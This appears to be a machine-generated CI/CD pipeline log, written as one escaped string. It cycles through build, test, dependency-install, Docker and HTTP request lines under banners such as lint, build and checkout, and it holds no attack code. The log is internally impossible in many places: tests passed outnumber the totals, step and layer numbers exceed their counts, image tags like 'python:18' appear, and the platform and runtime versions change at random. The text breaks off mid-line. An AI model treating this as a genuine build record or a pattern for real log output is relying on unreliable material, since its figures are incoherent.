INFO: Request completed\nCache restored successfully (428MB)\nLoading...\nSuccess!\nTLS handshake completed\nAlready up to date.\nConnecting to test.io:443...\nCache restored successfully (146MB)\n[12:19:08] INFO: Processing request\nnpm notice: package.json updated\nCache saved successfully\nHEAD is now at ee4dcea\nLayer 6/9: RUN command\nStep 20/15: Running migrations\nWaiting...\nCache invalidated: build\n[12:19:08] DEBUG: Query executed in 63ms\nPushing to registry...\n  PASS: test_auth_login (192ms)\nUploading artifact 'dist' (39 files)\nEnvironment: production\nInstalling lodash@4.12.4\nEnvironment: production\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompleted.\nPlatform: linux-x64\nFetching submodules...\nCache restored successfully (188MB)\n[12:19:08] DEBUG: Memory usage: 236MB\nCache miss for key-6050\nnpm notice: created a lockfile\nFetching submodules...\nStep 4/17: Running migrations\n\u2713 deploy completed\nCoverage: 88% statements, 66% branches\nnpm notice: package.json updated\nCoverage: 80% statements, 97% branches\n[12:19:08] DEBUG: Loading configuration\nSuccess!\n[12:19:08] INFO: Cache refreshed\nFetching submodules...\nnpm install: resolved 190 packages\nnpm notice: package.json updated\n[12:19:08] WARN: Deprecated API usage\nOK\nArtifact uploaded: build.tar.gz (10MB)\nCompiling utils/index.js...\nSuccess!\nEnvironment: development\nCache saved successfully\nWaiting...\nCompiling components/index.js...\nBundling runtime.css\nAlready up to date.\nTime: 80.574s\n\u2713 build completed\nCache saved successfully\nVerifying...\n\u2717 build failed with exit code 23\nUsing Python 3.9\nStep 13/23: Deploying\nLayer 3/14: RUN command\n\u2717 build failed with exit code 104\n  PASS: unit/test_db_connect.spec.js\nnpm install: resolved 491 packages\nTests: 457 passed, 233 total\n[12:19:08] INFO: Processing request\n[12:19:08] INFO: Request completed\n\u2713 package completed\nFinished.\n[12:19:08] DEBUG: Connection pool: 15 active\nGET /status - 204 (93ms)\nCompiling components/index.js...\n[12:19:08] DEBUG: Initializing service\nnpm notice: created a lockfile\nStep 20/24: Running migrations\nWaiting...\nBuilding Docker image...\nRan 172 tests in 23s\nNODE_ENV=development\nSwitched to branch 'bugfix/task-690'\nCompleted.\nyarn add: Done in 5.88s\nCache hit for key-1069\nFinished.\nConnection established\npip install: Successfully installed lodash-1.18\npip: Collecting react\nImage pulled successfully\nUsing Node.js 20.0.6\nBuilding Docker image...\nCompiling utils/handler.rs...\nConnecting to acme.corp:443...\nFetching submodules...\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nOptimizing 30 modules...\nEnvironment: test\n  PASS: unit/test_user_create.spec.js\npip: Collecting lodash\nConnection established\nCompiling components/main.py...\nStep 12/16: Running migrations\nTest Suites: 44 passed, 38 total\nPlatform: darwin-arm64\nLayer 3/8: COPY command\nStep 9/17: Building\nChecking out main branch\nnpm notice: package.json updated\n[12:19:08] INFO: Starting build process\nTransforming 513 files...\nCache hit for key-5713\nyarn add: Done in 11.2s\n[12:19:08] DEBUG: Query executed in 59ms\nnpm install: added 64 packages\nCompleted.\nCache restored successfully (187MB)\n=== Step deploy_production completed ===\n=== Step: type_check ===\n\u2713 All checks passed\nnpm install: resolved 734 packages\nCache restored successfully (373MB)\n[12:19:08] DEBUG: Memory usage: 1500MB\nSnapshots: 21 passed, 49 total\n[12:19:08] DEBUG: Loading configuration\nCompiling utils/utils.go...\nCompiling utils/utils.go...\nProcessing...\nProcessing...\npip: Installing build dependencies...\nyarn add: Done in 30.29s\n\u2713 Task completed in 4368ms\nWARNING: express has known vulnerabilities\nLayer 9/11: RUN command\nArtifact uploaded: dist.zip (21MB)\n[12:19:08] WARN: Deprecated API usage\nPlatform: linux-x64\nGenerating source maps...\n[12:19:08] INFO: Connecting to database\nStep 20/22: Testing\nTest Suites: 13 passed, 41 total\n[12:19:08] WARN: Deprecated API usage\n[12:19:08] INFO: Request completed\nConnecting to test.io:443...\nUsing Node.js 15.4.7\nBundling vendor.css\nWARNING: webpack has known vulnerabilities\nCoverage: 72% statements, 66% branches\nFAILED: test_user_create\nBuilding Docker image...\nStep 12/18: Deploying\nStep 17/19: Linting\nCoverage: 82% statements, 99% branches\nBuilding Docker image...\nProcessing...\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (50MB)\nTLS handshake completed\n[12:19:08] INFO: Starting build process\nCompiling lib/app.ts...\nArtifact uploaded: build.tar.gz (46MB)\n[12:19:08] INFO: Cache refreshed\nVerifying...\n\u2713 validate completed\nTest Suites: 15 passed, 6 total\nArtifact uploaded: dist.zip (67MB)\nSnapshots: 42 passed, 46 total\nEnvironment: test\nnpm install: added 285 packages\nyarn add: Done in 9.81s\nyarn add: Done in 6.72s\nArtifact uploaded: dist.zip (70MB)\nConnection established\nBundling styles.css\nGET /api - 201 (42ms)\nnpm install: added 382 packages\n[12:19:08] DEBUG: Query executed in 81ms\nCompiling components/handler.rs...\nCompiling src/service.java...\nArtifact downloaded: 44MB\n[12:19:08] ERROR: Connection failed\nSuccess!\nFinished.\nPushing to registry...\n[12:19:08] WARN: Deprecated API usage\nBundling runtime.css\nUsing Python 3.10\nCache saved successfully\nCache restored successfully (463MB)\n[12:19:08] INFO: Request completed\nRan 197 tests in 51s\nInstalling lodash@3.17.2\nUploading artifact 'dist' (11 files)\nNODE_ENV=production\nFinished.\nStep 7/17: Running migrations\n[12:19:08] DEBUG: Loading configuration\nCoverage: 100% statements, 89% branches\nnpm install: resolved 1115 packages\nConnection established\nTest Suites: 37 passed, 14 total\nCache hit for key-5713\nCache saved successfully\nWARNING: react has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFinished.\nPushing to registry...\nProcessing...\nVerifying...\nBundling main.js\nnpm notice: created a lockfile\nCompiling utils/app.ts...\nStep 12/24: Installing dependencies\n[12:19:08] DEBUG: Connection pool: 1 active\nStep 11/25: Testing\nImage pulled successfully\nnpm install: resolved 574 packages\nConnection established\nWARNING: jest has known vulnerabilities\nTime: 60.345s\n  PASS: unit/test_db_connect.spec.js\nVerifying...\nStep 2/16: Testing\nUsing Python 3.11\nFAILED: test_auth_login\npip: Collecting express\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm install: resolved 335 packages\nMinifying vendor.js\nCompiling components/handler.rs...\nSnapshots: 29 passed, 5 total\nMinifying vendor.js\n[12:19:08] WARN: Deprecated API usage\n[12:19:08] DEBUG: Query executed in 86ms\n[12:19:08] INFO: Connecting to database\n[12:19:08] INFO: Connecting to database\nProcessing...\nnpm install: resolved 1641 packages\n[12:19:08] INFO: Request completed\nTime: 100.768s\nInstalling lodash@3.9.10\nnpm install: added 260 packages\nSuccess!\nTime: 28.276s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nGET /health - 200 (90ms)\nNODE_ENV=development\nPOST /data - 201 (241ms)\nImage pulled successfully\nNODE_ENV=production\nInstalling axios@5.2.7\nOptimizing 18 modules...\nFetching submodules...\n[12:19:08] DEBUG: Initializing service\nWARNING: eslint has known vulnerabilities\nFetching submodules...\npip: Downloading jest-3.0.tar.gz\nTransforming 298 files...\nBundling runtime.js\nLayer 3/12: ENV command\nCreating production build...\n[12:19:08] INFO: Connecting to database\n[12:19:08] DEBUG: Initializing service\nConnecting to test.io:443...\n[12:19:08] WARN: Deprecated API usage\nBuilding Docker image...\nChecking out master branch\nWARNING: react has known vulnerabilities\n[12:19:08] INFO: Processing request\nCompleted.\nConnecting to acme.corp:443...\nAlready up to date.\nLayer 6/15: RUN command\nCache saved successfully\nInstalling axios@4.19.5\nnpm notice: created a lockfile\nCoverage: 81% statements, 98% branches\n[12:19:08] INFO: Processing request\nUsing Python 3.10\nStep 5/19: Building\nSnapshots: 45 passed, 37 total\nCoverage: 79% statements, 88% branches\nUsing Python 3.11\n=== Step type_check completed ===\n=== Step: save_cache ===\n\u2713 build completed\nStep 8/25: Deploying\nCache restored successfully (144MB)\nChecking out master branch\nWARNING: jest has known vulnerabilities\nLayer 9/8: ENV command\nStep 7/15: Testing\nRan 56 tests in 53s\nSuccess!\nStep 14/21: Testing\n\u2713 All checks passed\nCompleted.\nCache invalidated: dependencies\n  PASS: test_db_connect (278ms)\nPlatform: win32-x64\nConnecting to example.com:443...\nImage pulled successfully\nCache saved successfully\n\u2713 deploy completed\n  PASS: unit/test_db_connect.spec.js\nyarn add: Done in 7.87s\nStep 7/16: Building\nCompiling src/app.ts...\n\u2713 Task completed in 1346ms\nCreating production build...\n[12:19:08] INFO: Processing request\nHEAD is now at 815d0d5\nNODE_ENV=production\npip: Downloading eslint-2.20.tar.gz\nStep 7/20: Building\nFAILED: test_auth_login\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nFinished.\nInstalling webpack@4.16.8\nCompiling components/utils.go...\nPlatform: linux-x64\n\u2713 build completed\nyarn add: Done in 15.71s\nStep 20/19: Installing dependencies\nnpm notice: created a lockfile\nConnecting to test.io:443...\nOptimizing 86 modules...\nTransforming 774 files...\nDone.\nPOST /data - 200 (139ms)\nEnvironment: production\nnpm notice: package.json updated\n[12:19:08] DEBUG: Loading configuration\n[12:19:08] INFO: Processing request\nProcessing...\n\u2713 All checks passed\nFinished.\nCache saved successfully\nUploading artifact 'dist' (44 files)\nTransforming 356 files...\nWARNING: lodash has known vulnerabilities\nProcessing...\nTests: 405 passed, 69 total\nWARNING: webpack has known vulnerabilities\nPOST /upload - 200 (333ms)\n[12:19:08] DEBUG: Connection pool: 6 active\nLoading...\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nUsing Python 3.12\nTransforming 492 files...\nVerifying...\nCreating production build...\nCompiling src/app.ts...\nOptimizing 27 modules...\nnpm notice: package.json updated\nWaiting...\nStep 2/22: Linting\nnpm notice: package.json updated\nTest Suites: 25 passed, 29 total\n[12:19:08] ERROR: Connection failed\n\u2717 build failed with exit code 28\nyarn add: Done in 22.96s\nFinished.\nStep 16/20: Testing\npip install: Successfully installed webpack-2.16\n\u2713 package completed\npip install: Successfully installed react-5.7\nCache invalidated: build\n[12:19:08] INFO: Starting build process\n[12:19:08] DEBUG: Memory usage: 1195MB\n[12:19:08] DEBUG: Connection pool: 6 active\nTransforming 435 files...\nPOST /data - 202 (117ms)\nCreating production build...\nException: TypeError\n[12:19:08] INFO: Cache refreshed\nArtifact uploaded: build.tar.gz (8MB)\nPlatform: linux-x64\nCompiling utils/handler.rs...\nCompleted.\nArtifact uploaded: build.tar.gz (29MB)\nProcessing...\n[12:19:08] WARN: Deprecated API usage\nHEAD is now at 11684c6\n\u2713 validate completed\nStep 18/23: Deploying\nCompiling lib/index.js...\nCompiling utils/main.py...\n  PASS: test_cache_hit (117ms)\nOK\nyarn add: Done in 13.28s\nReady.\nSwitched to branch 'bugfix/task-474'\nStep 5/24: Installing dependencies\nVerifying...\nSwitched to branch 'hotfix/task-891'\nStep 2/24: Testing\nCache saved successfully\npip: Collecting prettier\nStep 12/25: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip: Collecting express\n[12:19:08] DEBUG: Loading configuration\nUsing Python 3.11\npip: Installing build dependencies...\n  PASS: test_cache_hit (23ms)\npip: Collecting lodash\nConnection established\nCreating production build...\n[12:19:08] INFO: Starting build process\nCreating production build...\nArtifact uploaded: build.tar.gz (21MB)\nFinished.\npip: Installing build dependencies...\nStep 16/19: Building\n[12:19:08] INFO: Connecting to database\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPlatform: win32-x64\nCache hit for key-6673\n[12:19:08] INFO: Request completed\npip install: Successfully installed jest-2.15\nReady.\n[12:19:08] DEBUG: Query executed in 42ms\n\u2717 build failed with exit code 42\nCompiling components/app.ts...\nFetching submodules...\n[12:19:08] INFO: Connecting to database\nGET /status - 204 (1ms)\nHEAD is now at 88e0e28\n[12:19:08] DEBUG: Memory usage: 613MB\npip: Installing build dependencies...\nStep 16/16: Linting\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nGET /health - 200 (25ms)\npip install: Successfully installed eslint-3.5\nCache saved successfully\nStep 15/17: Testing\nCache restored successfully (483MB)\nInstalling eslint@1.12.8\nSnapshots: 37 passed, 14 total\npip install: Successfully installed lodash-4.4\nWARNING: react has known vulnerabilities\nCompiling src/app.ts...\n[12:19:08] WARN: Deprecated API usage\n\u2713 Task completed in 4552ms\n=== Step save_cache completed ===\n=== Step: install_dependencies ===\nCache hit for key-3794\nFetching submodules...\n[12:19:08] DEBUG: Query executed in 11ms\nCache invalidated: build\nPulling image: node:18\nStep 11/25: Running migrations\nStep 8/24: Installing dependencies\nNODE_ENV=production\nCompiling components/main.py...\nWARNING: react has known vulnerabilities\n  PASS: test_cache_hit (355ms)\nGenerating source maps...\nnpm install: resolved 361 packages\nSwitched to branch 'feature/task-723'\nChecking out main branch\n[12:19:08] WARN: Deprecated API usage\nCache hit for key-3765\nWaiting...\n  PASS: test_auth_login (253ms)\nWaiting...\nTests: 123 passed, 89 total\n[12:19:08] WARN: Deprecated API usage\nDone.\nStep 17/23: Testing\nLoading...\nStep 19/16: Testing\nStep 11/18: Deploying\nPulling image: node:latest\nWARNING: express has known vulnerabilities\nCompiling utils/utils.go...\n[12:19:08] WARN: Deprecated API usage\n[12:19:08] WARN: Deprecated API usage\nStep 2/18: Running migrations\nArtifact downloaded: 44MB\n[12:19:08] DEBUG: Query executed in 87ms\n\u2713 Task completed in 3294ms\nStep 3/16: Deploying\nCache hit for key-3760\nLoading...\n[12:19:08] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 Step 'install' succeeded\nCreating production build...\nVerifying...\nProcessing...\nReady.\nnpm notice: package.json updated\n\u2713 test completed\nBundling vendor.js\nGenerating source maps...\nCompiling lib/utils.go...\n\u2713 All checks passed\nLoading...\nProcessing...\n[12:19:08] INFO: Starting build process\nImage pulled successfully\nSuccess!\n[12:19:08] DEBUG: Query executed in 45ms\nDone.\nDone.\nPulling image: python:18\n\u2713 deploy completed\nArtifact uploaded: build.tar.gz (36MB)\nTLS handshake completed\nEnvironment: test\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSuccess!\n[12:19:08] INFO: Connecting to database\nHEAD is now at a16f0b9\nCreating production build...\n[12:19:08] INFO: Connecting to database\nStep 18/20: Building\n\u2713 All checks passed\nWARNING: prettier has known vulnerabilities\nCoverage: 86% statements, 85% branches\nVerifying...\n[12:19:08] INFO: Request completed\nFinished.\nCoverage: 73% statements, 86% branches\nnpm notice: package.json updated\nDone.\nStep 10/22: Building\nCompiling components/service.java...\n\u2713 package completed\n  PASS: test_user_create (224ms)\nCreating production build...\nNODE_ENV=production\nUploading artifact 'build' (1 files)\n\u2713 Task completed in 4878ms\nAlready up to date.\nnpm install: added 433 packages\nSwitched to branch 'feature/task-500'\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 All checks passed\nnpm install: resolved 477 packages\n[12:19:08] DEBUG: Connection pool: 11 active\n[12:19:08] DEBUG: Memory usage: 806MB\nReady.\n[12:19:08] INFO: Cache refreshed\npip: Installing build dependencies...\nStep 14/21: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/service.java...\n[12:19:08] DEBUG: Query executed in 76ms\n\u2717 build failed with exit code 89\nConnection established\nStep 10/15: Running migrations\nUsing Python 3.10\nVerifying...\nGET /health - 200 (50ms)\nWaiting...\nCache invalidated: node_modules\n[12:19:08] WARN: Deprecated API usage\nPushing to registry...\nProcessing...\nConnection established\nCache hit for key-6249\nLayer 5/10: COPY command\nInstalling eslint@2.9.10\npip install: Successfully installed express-3.17\nFetching submodules...\nPulling image: node:latest\nInstalling lodash@2.9.3\nSnapshots: 36 passed, 38 total\nPlatform: darwin-arm64\n[12:19:08] DEBUG: Initializing service\nPlatform: win32-x64\nCache invalidated: node_modules\nnpm notice: package.json updated\nCompiling lib/handler.rs...\nnpm notice: created a lockfile\nTLS handshake completed\nnpm install: resolved 1290 packages\nTest Suites: 43 passed, 7 total\nPulling image: alpine:3.11\nProcessing...\n\u2713 All checks passed\n[12:19:08] ERROR: Connection failed\nInstalling eslint@5.1.6\n[12:19:08] INFO: Starting build process\nTLS handshake completed\nTime: 114.941s\nCache restored successfully (206MB)\nWARNING: prettier has known vulnerabilities\nCreating production build...\n\u2713 build completed\nCache saved successfully\nFinished.\nDone.\nReady.\n[12:19:08] DEBUG: Memory usage: 696MB\nReady.\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 Task completed in 757ms\nPOST /api - 201 (102ms)\nRan 125 tests in 17s\nImage pulled successfully\nProcessing...\nFinished.\nWARNING: axios has known vulnerabilities\nStep 11/25: Running migrations\nGenerating source maps...\n[12:19:08] INFO: Starting build process\n=== Step install_dependencies completed ===\n=== Step: lint ===\n\u2713 test completed\nStep 1/19: Building\n  PASS: integration/test_cache_hit.spec.js\n\u2713 All checks passed\nTests: 228 passed, 423 total\npip: Installing build dependencies...\nCompiling lib/utils.go...\nGenerating source maps...\nFetching submodules...\n  PASS: test_api_health (423ms)\nHEAD is now at e51d49c\nInstalling express@4.0.0\n\u2713 Task completed in 1502ms\nWaiting...\nnpm install: added 405 packages\n[12:19:08] INFO: Request completed\nPOST /data - 202 (158ms)\nStep 1/22: Running migrations\nOK\nTLS handshake completed\n  PASS: test_cache_hit (125ms)\nGET /api - 201 (88ms)\nUsing Python 3.9\n[12:19:08] WARN: Deprecated API usage\nCache miss for key-6810\n[12:19:08] INFO: Request completed\nUploading artifact 'dist' (40 files)\n\u2717 build failed with exit code 54\nnpm install: added 32 packages\nnpm notice: created a lockfile\nSwitched to branch 'feature/task-856'\n[12:19:08] INFO: Cache refreshed\n[12:19:08] INFO: Connecting to database\nHEAD is now at 090c8d3\nRan 115 tests in 12s\nSuccess!\n\u2713 Task completed in 208ms\nWARNING: express has known vulnerabilities\nWARNING: express has known vulnerabilities\n\u2713 Task completed in 962ms\nProcessing...\nRan 123 tests in 14s\nCache invalidated: build\n[12:19:08] WARN: Deprecated API usage\nCompiling utils/main.py...\nCache saved successfully\nConnecting to acme.corp:443...\n[12:19:08] ERROR: Connection failed\n\u2713 All checks passed\nLayer 1/14: RUN command\nTime: 66.874s\n\u2713 Step 'test' succeeded\n[12:19:08] DEBUG: Query executed in 28ms\nArtifact uploaded: dist.zip (72MB)\n[12:19:08] INFO: Processing request\n\u2713 Task completed in 3996ms\nTests: 237 passed, 368 total\n\u2717 build failed with exit code 49\npip: Collecting axios\nnpm notice: created a lockfile\n[12:19:08] WARN: Deprecated API usage\n[12:19:08] DEBUG: Initializing service\nBuilding Docker image...\n[12:19:08] WARN: Deprecated API usage\nRan 101 tests in 44s\npip: Collecting webpack\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nHEAD is now at 0220751\n  PASS: integration/test_user_create.spec.js\nStep 8/25: Linting\nCompiling utils/service.java...\nCache hit for key-3907\nTime: 87.731s\n[12:19:08] DEBUG: Initializing service\nInstalling express@4.5.8\n[12:19:08] DEBUG: Loading configuration\n\u2713 Step 'test' succeeded\nCache saved successfully\nFetching submodules...\nInstalling react@4.0.1\nCache invalidated: build\nNODE_ENV=development\n[12:19:08] INFO: Processing request\nStep 18/25: Building\nChecking out master branch\nStep 8/20: Running migrations\nVerifying...\npip: Downloading lodash-5.1.tar.gz\nCompleted.\nPulling image: node:3.11\n[12:19:08] DEBUG: Connection pool: 2 active\nGET /health - 200 (79ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: dist.zip (71MB)\nInstalling webpack@3.20.8\npip: Installing build dependencies...\n[12:19:08] INFO: Request completed\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling components/utils.go...\nUsing Node.js 15.7.3\nConnection established\nLayer 3/12: RUN command\nyarn add: Done in 5.8s\nLayer 4/12: COPY command\nPlatform: linux-x64\nCompiling src/service.java...\n[12:19:08] DEBUG: Query executed in 64ms\nCompiling utils/utils.go...\nCompiling src/main.py...\nTLS handshake completed\npip: Downloading express-5.2.tar.gz\nStep 2/21: Testing\nTLS handshake completed\nCache restored successfully (294MB)\nWARNING: webpack has known vulnerabilities\nLayer 5/11: RUN command\nStep 13/25: Running migrations\n[12:19:08] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nLayer 8/10: RUN command\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nGenerating source maps...\nTime: 62.399s\n[12:19:08] DEBUG: Connection pool: 1 active\nUsing Node.js 17.16.6\nWARNING: lodash has known vulnerabilities\nCompiling components/app.ts...\nStep 8/25: Building\nStep 3/25: Installing dependencies\nMinifying vendor.js\nnpm notice: package.json updated\nGET /api - 204 (19ms)\n  PASS: unit/test_cache_hit.spec.js\nBundling vendor.js\nUsing Python 3.11\nPOST /api - 202 (426ms)\nFinished.\nOptimizing 51 modules...\nArtifact uploaded: build.tar.gz (14MB)\n\u2713 test completed\nProcessing...\nHEAD is now at 44b71c8\nStep 7/16: Testing\nOptimizing 31 modules...\nUsing Python 3.12\n[12:19:08] WARN: Deprecated API usage\nTime: 106.783s\n\u2713 All checks passed\nEnvironment: production\nConnection established\nTLS handshake completed\n[12:19:08] DEBUG: Connection pool: 7 active\nBuilding Docker image...\nPlatform: win32-x64\n\u2713 validate completed\nPulling image: python:3.11\nConnection established\nnpm install: resolved 1451 packages\nUploading artifact 'dist' (1 files)\nnpm notice: package.json updated\nCompiling components/handler.rs...\nChecking out main branch\nVerifying...\nPOST /api - 200 (337ms)\n=== Step lint completed ===\n=== Step: build ===\nCoverage: 81% statements, 83% branches\nyarn add: Done in 20.67s\nDone.\nCompiling src/utils.go...\nStep 3/19: Running migrations\nHEAD is now at 1b5574a\nGET /health - 200 (6ms)\nTransforming 994 files...\nInstalling express@1.6.0\n[12:19:08] INFO: Cache refreshed\nMinifying main.js\nLayer 7/15: COPY command\nBuilding Docker image...\nOptimizing 82 modules...\n[12:19:08] INFO: Cache refreshed\n[12:19:08] INFO: Cache refreshed\nSwitched to branch 'feature/task-957'\nWaiting...\nUsing Python 3.9\nUploading artifact 'coverage' (15 files)\n\u2713 package completed\n[12:19:08] DEBUG: Initializing service\n[12:19:08] DEBUG: Initializing service\nTransforming 190 files...\nStep 7/15: Running migrations\n[12:19:08] INFO: Cache refreshed\nCache saved successfully\n[12:19:08] ERROR: Connection failed\nWARNING: axios has known vulnerabilities\n[12:19:08] INFO: Request completed\n[12:19:08] DEBUG: Initializing service\n[12:19:08] DEBUG: Memory usage: 345MB\n[12:19:08] DEBUG: Initializing service\nCache invalidated: node_modules\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nOptimizing 26 modules...\n[12:19:08] WARN: Deprecated API usage\nLoading...\nStep 18/25: Building\nStep 17/20: Building\nSwitched to branch 'hotfix/task-440'\nTLS handshake completed\nTime: 8.568s\nGET /health - 204 (36ms)\n\u2717 build failed with exit code 66\n  PASS: test_user_create (315ms)\nyarn add: Done in 18.54s\nnpm notice: package.json updated\nFAILED: test_user_create\n[12:19:08] WARN: Deprecated API usage\nRan 166 tests in 40s\nyarn add: Done in 4.62s\nWARNING: react has known vulnerabilities\nPulling image: alpine:18\nArtifact downloaded: 48MB\n[12:19:08] ERROR: Connection failed\nArtifact downloaded: 25MB\n  PASS: e2e/test_cache_hit.spec.js\nImage pulled successfully\nConnection established\nCache saved successfully\nTransforming 480 files...\n[12:19:08] INFO: Starting build process\n[12:19:08] INFO: Request completed\nWaiting...\nSnapshots: 14 passed, 18 total\npip: Collecting lodash\n[12:19:08] DEBUG: Memory usage: 1762MB\n[12:19:08] WARN: Deprecated API usage\nStep 20/20: Deploying\nGET /api - 204 (41ms)\n\u2713 package completed\nRan 75 tests in 17s\nSnapshots: 13 passed, 3 total\n  PASS: test_user_create (449ms)\nWARNING: react has known vulnerabilities\nStep 2/19: Testing\nArtifact downloaded: 43MB\n[12:19:08] DEBUG: Loading configuration\nnpm install: added 154 packages\nReady.\nStep 2/22: Linting\nProcessing...\nCompleted.\nCache restored successfully (134MB)\nCompiling src/index.js...\nCompleted.\nArtifact uploaded: build.tar.gz (1MB)\n[12:19:08] INFO: Connecting to database\npip: Installing build dependencies...\nConnecting to acme.corp:443...\nReady.\nReady.\nConnection established\nUsing Node.js 20.1.5\n[12:19:08] DEBUG: Connection pool: 14 active\nStep 1/19: Installing dependencies\nCache saved successfully\nLayer 2/8: ENV command\nCompiling lib/index.js...\nStep 2/18: Running migrations\nGET /api - 201 (29ms)\nCache restored successfully (392MB)\nStep 16/25: Testing\nTransforming 192 files...\nTests: 479 passed, 285 total\nHEAD is now at 245059f\nCoverage: 82% statements, 74% branches\nStep 12/20: Installing dependencies\nStep 4/24: Building\nBundling vendor.js\nProcessing...\nnpm install: resolved 795 packages\nArtifact uploaded: build.tar.gz (28MB)\nEnvironment: staging\nWARNING: lodash has known vulnerabilities\n[12:19:08] WARN: Deprecated API usage\nWARNING: lodash has known vulnerabilities\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSwitched to branch 'hotfix/task-371'\nBuilding Docker image...\nyarn add: Done in 21.58s\nnpm install: resolved 975 packages\nFAILED: test_user_create\nArtifact uploaded: build.tar.gz (4MB)\nyarn add: Done in 21.95s\nPushing to registry...\n[12:19:08] ERROR: Connection failed\n[12:19:08] DEBUG: Loading configuration\nGenerating source maps...\nConnection established\nStep 16/16: Linting\npip: Installing build dependencies...\nBuilding Docker image...\nUsing Node.js 17.17.7\nWARNING: express has known vulnerabilities\nLayer 1/8: COPY command\nyarn add: Done in 15.72s\nnpm notice: created a lockfile\nEnvironment: production\nCoverage: 88% statements, 100% branches\nLayer 4/11: ENV command\nTests: 183 passed, 162 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nLoading...\n[12:19:08] WARN: Deprecated API usage\nFetching submodules...\n[12:19:08] WARN: Deprecated API usage\nStep 7/23: Deploying\nnpm notice: package.json updated\n[12:19:08] INFO: Cache refreshed\nnpm notice: package.json updated\nCache miss for key-1089\nTests: 425 passed, 350 total\nCompiling components/index.js...\nDone.\nDone.\n[12:19:08] WARN: Deprecated API usage\n\u2713 All checks passed\nCompiling components/service.java...\n\u2713 Task completed in 475ms\nPushing to registry...\nTransforming 502 files...\nFetching submodules...\n=== Step build completed ===\n=== Step: checkout ===\nTest Suites: 7 passed, 33 total\nChecking out main branch\n[12:19:08] DEBUG: Memory usage: 654MB\npip: Installing build dependencies...\nRan 108 tests in 28s\nWaiting...\n[12:19:08] DEBUG: Memory usage: 912MB\n[12:19:08] DEBUG: Memory usage: 1097MB\nnpm notice: created a lockfile\nCompiling utils/handler.rs...\nCompiling components/main.py...\n[12:19:08] INFO: Starting build process\nnpm install: added 226 packages\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTime: 80.473s\nTests: 408 passed, 367 total\nPOST /data - 200 (235ms)\nBuilding Docker image...\nGET /status - 204 (78ms)\nCache invalidated: dependencies\nStep 4/20: Deploying\nSwitched to branch 'feature/task-385'\nGenerating source maps...\nRan 59 tests in 35s\n[12:19:08] DEBUG: Initializing service\npip: Installing build dependencies...\nRan 57 tests in 35s\nPushing to registry...\nTime: 39.44s\nPushing to registry...\nFinished.\nCache miss for key-7438\n[12:19:08] DEBUG: Query executed in 65ms\nFinished.\n\u2713 lint completed\nTransforming 137 files...\n[12:19:08] INFO: Processing request\nCompiling utils/handler.rs...\nStep 5/21: Deploying\nVerifying...\nWARNING: lodash has known vulnerabilities\nyarn add: Done in 22.94s\n[12:19:08] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nHEAD is now at 82ff907\nnpm notice: package.json updated\nWARNING: express has known vulnerabilities\nEnvironment: development\npip install: Successfully installed lodash-2.15\n[12:19:08] INFO: Request completed\n[12:19:08] INFO: Connecting to database\nGenerating source maps...\nnpm install: resolved 870 packages\n[12:19:08] INFO: Cache refreshed\nStep 3/24: Running migrations\nCompleted.\nTransforming 267 files...\nWARNING: eslint has known vulnerabilities\nReady.\nReady.\nCache hit for key-6087\npip: Installing build dependencies...\nRan 28 tests in 13s\n[12:19:08] DEBUG: Connection pool: 13 active\n[12:19:08] ERROR: Connection failed\nCache invalidated: node_modules\nGenerating source maps...\nGenerating source maps...\n\u2713 Task completed in 1372ms\nPushing to registry...\nTest Suites: 7 passed, 49 total\nOK\nOK\nStep 10/18: Linting\n\u2713 deploy completed\n[12:19:08] INFO: Connecting to database\nCache miss for key-2136\nWaiting...\npip: Collecting eslint\npip: Downloading axios-1.7.tar.gz\nStep 18/20: Installing dependencies\nBuilding Docker image...\nStep 12/16: Testing\n[12:19:08] INFO: Cache refreshed\nOptimizing 10 modules...\nBuilding Docker image...\npip: Downloading eslint-3.3.tar.gz\nImage pulled successfully\n[12:19:08] INFO: Cache refreshed\nCache restored successfully (495MB)\nCache saved successfully\n[12:19:08] INFO: Starting build process\nArtifact uploaded: dist.zip (53MB)\nStep 8/23: Running migrations\n[12:19:08] DEBUG: Connection pool: 3 active\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 16/19: Linting\nCreating production build...\n[12:19:08] WARN: Deprecated API usage\nCache hit for key-4534\nEnvironment: production\nStep 17/23: Linting\nCoverage: 87% statements, 99% branches\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nUploading artifact 'dist' (6 files)\nStep 19/21: Running migrations\nArtifact uploaded: dist.zip (87MB)\n[12:19:08] INFO: Processing request\nCache saved successfully\n[12:19:08] DEBUG: Initializing service\nInstalling webpack@1.3.8\n\u2717 build failed with exit code 70\n[12:19:08] INFO: Processing request\nUsing Node.js 14.9.10\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 